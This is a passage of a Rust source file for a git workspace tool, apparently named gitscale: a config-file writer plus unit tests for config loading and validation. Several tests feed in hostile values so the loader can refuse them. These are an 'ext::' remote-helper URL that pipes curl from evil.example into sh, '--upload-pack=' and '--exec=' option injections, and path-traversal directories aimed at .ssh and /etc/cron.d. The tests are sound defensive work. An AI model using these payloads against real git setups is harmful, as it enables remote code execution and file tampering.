    out.push('"');
    out
}

/// Rewrite the config file from `config`.
///
/// Takes the whole config rather than the parts a caller happens to be
/// changing: this replaces the file wholesale, so every table it does not
/// write is a table it deletes.
pub fn write_config(config_path: &Path, config: &GitScaleConfig) -> Result<()> {
    let mut lines: Vec<String> = Vec::new();

    // A top-level key: it must come before the first table.
    if config.singleton {
        lines.push("singleton = true".to_string());
        lines.push(String::new());
    }

    if config.resolve != ResolveSettings::default() {
        lines.push("[resolve]".to_string());
        if config.resolve.hoist_dir != DEFAULT_HOIST_DIR {
            lines.push(format!(
                "hoist_dir = {}",
                toml_string(&config.resolve.hoist_dir)
            ));
        }
        if !config.resolve.allow.is_empty() {
            let quoted: Vec<String> = config
                .resolve
                .allow
                .iter()
                .map(|p| toml_string(p))
                .collect();
            lines.push(format!("allow = [{}]", quoted.join(", ")));
        }
        lines.push(String::new());
    }

    if let Some(pinned) = &config.develop.pinned {
        let quoted: Vec<String> = pinned.iter().map(|b| toml_string(b)).collect();
        lines.push("[develop]".to_string());
        lines.push(format!("pinned = [{}]", quoted.join(", ")));
        lines.push(String::new());
    }

    if let Some(parallel) = config.forward.parallel {
        lines.push("[forward]".to_string());
        lines.push(format!("parallel = {}", parallel));
        lines.push(String::new());
    }

    if let Some(prefix) = &config.topic.prefix {
        lines.push("[topic]".to_string());
        lines.push(format!("prefix = {}", toml_string(prefix)));
        lines.push(String::new());
    }

    if !config.registries.is_empty() {
        lines.push("[registries]".to_string());
        for (key, registry) in &config.registries {
            lines.push(format!("{} = {}", toml_string(key), toml_string(registry)));
        }
        lines.push(String::new());
    }

    if let Some(artefact) = &config.artefact {
        let list = |patterns: &[String]| {
            let quoted: Vec<String> = patterns.iter().map(|p| toml_string(p)).collect();
            format!("[{}]", quoted.join(", "))
        };
        lines.push("[artefact]".to_string());
        match artefact.layers.as_slice() {
            [only] if only.name == DEFAULT_LAYER => {
                lines.push(format!("include = {}", list(&only.include)));
                if !only.exclude.is_empty() {
                    lines.push(format!("exclude = {}", list(&only.exclude)));
                }
                lines.push(String::new());
            }
            layers => {
                lines.push(String::new());
                for layer in layers {
                    lines.push("[[artefact.layer]]".to_string());
                    lines.push(format!("name = {}", toml_string(&layer.name)));
                    lines.push(format!("include = {}", list(&layer.include)));
                    if !layer.exclude.is_empty() {
                        lines.push(format!("exclude = {}", list(&layer.exclude)));
                    }
                    lines.push(String::new());
                }
            }
        }
    }

    if config.hooks.post_sync.is_some() || config.hooks.on_pull_error.is_some() {
        lines.push("[hooks]".to_string());
        if let Some(cmd) = &config.hooks.post_sync {
            lines.push(format!("post_sync = {}", toml_string(cmd)));
        }
        if let Some(policy) = config.hooks.on_pull_error {
            lines.push(format!("on_pull_error = {}", toml_string(policy.as_str())));
        }
        lines.push(String::new());
    }

    if !config.clean.exclude.is_empty() || config.clean.keep_recent.is_some() {
        lines.push("[clean]".to_string());
        if !config.clean.exclude.is_empty() {
            let patterns: Vec<String> = config
                .clean
                .exclude
                .iter()
                .map(|p| toml_string(p))
                .collect();
            lines.push(format!("exclude = [{}]", patterns.join(", ")));
        }
        if let Some(period) = &config.clean.keep_recent {
            lines.push(format!("keep_recent = {}", toml_string(period)));
        }
        lines.push(String::new());
    }

    if !config.repos.is_empty() {
        lines.push("[repos]".to_string());
        let mut sorted: Vec<&RepoEntry> = config.repos.iter().collect();
        sorted.sort_by(|a, b| a.directory.cmp(&b.directory));
        for entry in sorted {
            let mut parts = vec![format!("url = {}", toml_string(&entry.repo_url))];
            if !entry.revision.is_empty() {
                parts.push(format!("revision = {}", toml_string(&entry.revision)));
            }
            if let Some(artefact) = entry.artefact {
                parts.push(format!("artefact = {}", toml_string(&artefact.to_string())));
            }
            if !entry.recursive {
                parts.push("recursive = false".to_string());
            }
            if entry.is_override {
                parts.push("override = true".to_string());
            }
            if let Some(singleton) = entry.singleton {
                parts.push(format!("singleton = {}", singleton));
            }
            let inline = parts.join(", ");
            lines.push(format!(
                "{} = {{ {} }}",
                toml_string(&entry.directory),
                inline
            ));
        }
    }

    lines.push(String::new()); // trailing newline
    std::fs::write(config_path, lines.join("\n"))
        .with_context(|| format!("cannot write {}", config_path.display()))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Tests run in parallel in one process, so each config gets its own
    /// directory rather than sharing a path.
    fn load(text: &str) -> Result<GitScaleConfig> {
        use std::sync::atomic::{AtomicUsize, Ordering};
        static SEQ: AtomicUsize = AtomicUsize::new(0);
        let dir = std::env::temp_dir().join(format!(
            "gitscale-cfg-{}-{}",
            std::process::id(),
            SEQ.fetch_add(1, Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join(CONFIG_FILENAME);
        std::fs::write(&path, text).unwrap();
        let result = load_config(&path);
        let _ = std::fs::remove_dir_all(&dir);
        result
    }

    #[test]
    fn ordinary_urls_still_load() {
        let config = load(
            r#"
[registries]
"git.corp.example" = "registry.corp.example"

[repos]
"libs/a" = { url = "git@github.com:thepartly/a.git", revision = "main" }
"libs/b" = { url = "https://github.com/thepartly/b.git", revision = "v1.2.3" }
"libs/c" = { url = "/srv/mirrors/c.git", revision = "main" }
"#,
        )
        .expect("a normal config should load");
        assert_eq!(config.repos.len(), 3);
    }

    #[test]
    fn remote_helper_urls_are_refused() {
        // `ext::` runs the rest of the URL as a command: code execution from a
        // repo URL alone, with no [hooks] table in sight.
        let err = load(
            r#"[repos]
"libs/a" = { url = "ext::sh -c 'curl https://evil.example/p | sh'", revision = "main" }
"#,
        )
        .unwrap_err()
        .to_string();
        assert!(err.contains("remote helper"), "{}", err);

        assert!(load("[repos]\n\"a\" = { url = \"fd::7\", revision = \"main\" }\n").is_err());
    }

    #[test]
    fn urls_containing_a_double_colon_are_left_alone() {
        // Only a bare-word prefix is a helper; these are ordinary URLs.
        assert!(remote_helper_prefix("https://[::1]:8080/a/b.git").is_none());
        assert!(remote_helper_prefix("https://example.com/a::b.git").is_none());
        assert!(remote_helper_prefix("ext::sh -c payload") == Some("ext"));
    }

    #[test]
    fn option_like_values_are_refused() {
        // git would read these as flags — `--upload-pack=` is a shell in disguise.
        assert!(load("[repos]\n\"a\" = { url = \"--upload-pack=payload\" }\n").is_err());
        assert!(load(
            "[repos]\n\"a\" = { url = \"https://example.com/a.git\", revision = \"--exec=payload\" }\n"
        )
        .is_err());
    }

    #[test]
    fn a_registry_is_given_without_a_scheme() {
        assert!(load("[registries]\n\"git.example\" = \"https://r.example\"\n").is_err());
        assert!(load("[registries]\n\"git.example\" = \"http://r.example:5000\"\n").is_ok());
        let config = load("[registries]\n\"git.example\" = \"r.example:5000/ns\"\n").unwrap();
        assert_eq!(config.registries["git.example"], "r.example:5000/ns");
    }

    #[test]
    fn hex_revisions_are_names_unless_they_are_full_shas() {
        // An all-hex branch or tag name is accepted, source or artefact: only
        // a full SHA is taken for a commit, and a name that matches nothing
        // fails when it is looked up, with a hint about abbreviated commits.
        for artefact in ["", ", artefact = \"replace\""] {
            for revision in [
                "20241001",
                "cafe123",
                "9fceb02d0ae598e95dc970b74767f19372d61af8",
            ] {
                let text = format!(
                    "[repos]\n\"a\" = {{ url = \"https://example.com/a.git\", revision = \"{}\"{} }}\n",
                    revision, artefact
                );
                assert!(load(&text).is_ok(), "{} {}", artefact, revision);
            }
        }
        assert!(!crate::git::is_full_sha("20241001"));
        assert!(crate::git::is_full_sha(&"a".repeat(64)));
        assert!(!crate::git::is_full_sha(&"a".repeat(41)));
    }

    #[test]
    fn a_single_group_can_skip_the_layer_tables() {
        let config =
            load("[artefact]\ninclude = [\"dist/**\"]\nexclude = [\"**/*.map\"]\n").unwrap();
        let spec = config.artefact.unwrap();
        assert_eq!(spec.layers.len(), 1);
        assert_eq!(spec.layers[0].name, DEFAULT_LAYER);
        assert_eq!(spec.layers[0].exclude, vec!["**/*.map"]);
    }

    #[test]
    fn layer_groups_keep_their_order() {
        let config = load(
            "[[artefact.layer]]\nname = \"vendor\"\ninclude = [\"vendor/**\"]\n\n\
             [[artefact.layer]]\nname = \"app\"\ninclude = [\"**\"]\n",
        )
        .unwrap();
        let names: Vec<String> = config
            .artefact
            .unwrap()
            .layers
            .into_iter()
            .map(|l| l.name)
            .collect();
        assert_eq!(names, vec!["vendor", "app"]);
    }

    #[test]
    fn broken_artefact_tables_are_refused() {
        for text in [
            "[artefact]\n",
            "[artefact]\nincludes = [\"**\"]\n",
            "[artefact]\ninclude = [\"**\"]\n[[artefact.layer]]\nname = \"a\"\ninclude = [\"**\"]\n",
            // Image paths are repository paths: there is no root to move them.
            "[artefact]\nroot = \"dist\"\ninclude = [\"**\"]\n",
            "[artefact]\ninclude = [\"../**\"]\n",
            "[artefact]\ninclude = [\"/etc/**\"]\n",
            "[artefact]\ninclude = [\"\"]\n",
            "[artefact]\ninclude = [\"a/[\"]\n",
            "[[artefact.layer]]\nname = \"a\"\ninclude = [\"**\"]\n[[artefact.layer]]\nname = \"a\"\ninclude = [\"x\"]\n",
            "[[artefact.layer]]\nname = \"has space\"\ninclude = [\"**\"]\n",
            "[[artefact.layer]]\nname = \"a\"\n",
        ] {
            assert!(load(text).is_err(), "should refuse:\n{}", text);
        }
    }

    #[test]
    fn artefact_and_registries_survive_a_rewrite() {
        for text in [
            "[registries]\n\"git.example\" = \"r.example\"\n\n[artefact]\ninclude = [\"dist/**\"]\nexclude = [\"*.map\"]\n",
            "[[artefact.layer]]\nname = \"vendor\"\ninclude = [\"vendor/**\"]\n\n[[artefact.layer]]\nname = \"app\"\ninclude = [\"**\"]\nexclude = [\"x\"]\n",
        ] {
            let before = load(text).unwrap();
            let dir = std::env::temp_dir().join(format!("gitscale-cfg-rw-{}-{}", std::process::id(), text.len()));
            std::fs::create_dir_all(&dir).unwrap();
            let path = dir.join(CONFIG_FILENAME);
            write_config(&path, &before).unwrap();
            let after = load_config(&path).unwrap();
            let _ = std::fs::remove_dir_all(&dir);
            assert_eq!(before.registries, after.registries);
            assert_eq!(before.artefact, after.artefact);
        }
    }

    #[test]
    fn entries_are_written_sorted_by_directory() {
        let mut config =
            load("[repos]\n\"imports/z\" = { url = \"https://example.com/z.git\" }\n").unwrap();
        config.repos.push(RepoEntry {
            directory: "imports/a".to_string(),
            repo_url: "https://example.com/a.git".to_string(),
            ..RepoEntry::default()
        });
        let dir = std::env::temp_dir().join(format!("gitscale-cfg-sort-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join(CONFIG_FILENAME);
        write_config(&path, &config).unwrap();
        let text = std::fs::read_to_string(&path).unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            text.find("imports/a").unwrap() < text.find("imports/z").unwrap(),
            "{}",
            text
        );
    }

    #[test]
    fn artefact_use_is_replace_or_overlay() {
        let config = load(
            "[repos]\n\"a\" = { url = \"https://example.com/a.git\", artefact = \"replace\" }\n\
             \"b\" = { url = \"https://example.com/b.git\", artefact = \"overlay\" }\n\
             \"c\" = { url = \"https://example.com/c.git\" }\n",
        )
        .unwrap();
        let by = |d: &str| config.repos.iter().find(|e| e.directory == d).unwrap();
        assert!(by("a").is_artefact());
        assert!(by("b").is_overlay() && !by("b").is_artefact());
        assert_eq!(by("c").artefact, None);
        assert!(load(
            "[repos]\n\"a\" = { url = \"https://example.com/a.git\", artefact = \"yes\" }\n"
        )
        .is_err());
    }

    #[test]
    fn develop_pinned_and_keep_recent_survive_a_rewrite() {
        let before = load(
            "[develop]\npinned = [\"main\", \"release/*\"]\n\n[clean]\nkeep_recent = \"6months\"\n",
        )
        .unwrap();
        assert_eq!(
            before.develop.pinned,
            Some(vec!["main".to_string(), "release/*".to_string()])
        );
        let dir = std::env::temp_dir().join(format!("gitscale-cfg-dev-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join(CONFIG_FILENAME);
        write_config(&path, &before).unwrap();
        let after = load_config(&path).unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(before.develop, after.develop);
        assert_eq!(after.clean.keep_recent.as_deref(), Some("6months"));
        assert!(load("[clean]\nkeep_recent = \"soon\"\n").is_err());
        assert!(load("[develop]\npinned = [\"\"]\n").is_err());
    }

    #[test]
    fn a_dependency_config_says_which_branches_it_pins() {
        let text = "[develop]\npinned = [\"staging\"]\n\n[hooks]\nwhatever = 1\n";
        let parsed = parse_dependency_config(text, Path::new("dep")).unwrap();
        assert_eq!(parsed.develop.pinned, Some(vec!["staging".to_string()]));
        let unset = parse_dependency_config("", Path::new("dep")).unwrap();
        assert_eq!(unset.develop.pinned, None);
    }

    #[test]
    fn set_revisions_keeps_comments_and_adds_a_missing_revision() {
        let dir = std::env::temp_dir().join(format!("gitscale-cfg-set-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join(CONFIG_FILENAME);
        std::fs::write(
            &path,
            "# top\n[repos]\n\"a\" = { url = \"u\", revision = \"v1\" } # keep\n\"b\" = { url = \"w\" }\n",
        )
        .unwrap();
        set_revisions(
            &path,
            &[
                ("a".to_string(), "v2".to_string()),
                ("b".to_string(), "v3".to_string()),
            ],
        )
        .unwrap();
        let text = std::fs::read_to_string(&path).unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(
            text.contains("# top") && text.contains("# keep"),
            "{}",
            text
        );
        assert!(text.contains("revision = \"v2\""), "{}", text);
        assert!(text.contains("revision = \"v3\""), "{}", text);
    }

    #[test]
    fn directories_must_stay_inside_the_workspace() {
        assert!(load(
            "[repos]\n\"../../../home/dev/.ssh\" = { url = \"https://example.com/a.git\" }\n"
        )
        .is_err());
        assert!(
            load("[repos]\n\"/etc/cron.d\" = { url = \"https://example.com/a.git\" }\n").is_err()
        );
        // A `..` in the middle escapes just as well as one at the front.
        assert!(
            load("[repos]\n\"libs/../../x\" = { url = \"https://example.com/a.git\" }\n").is_err()
        );
    }
}
